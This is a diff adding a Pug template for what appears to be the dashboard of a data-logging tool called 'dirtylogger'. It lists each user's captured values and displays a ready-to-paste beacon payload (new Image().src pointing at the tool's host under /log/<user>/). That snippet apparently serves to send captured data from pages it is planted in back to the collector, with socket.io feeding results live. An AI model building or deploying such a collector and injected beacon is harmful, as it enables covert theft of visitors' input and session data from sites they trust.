@@ -1,0 +1,20 @@
+doctype html
+html(lang="en")
+  head
+    title dirtylogger
+    link(href='public/style.css', rel='stylesheet', type='text/css')
+  body
+    h1.
+      User: #{user.name}
+
+    input(id='user', class='hidden', value='#{user.name}')
+
+    pre.
+      new Image().src = "#{protocol}://#{host}/log/#{user.name}/{value}";
+
+    ul
+      each val in user.list
+        li= val
+
+    script(src='/socket.io/socket.io.js')
+    script(src='public/dirtylog.js')
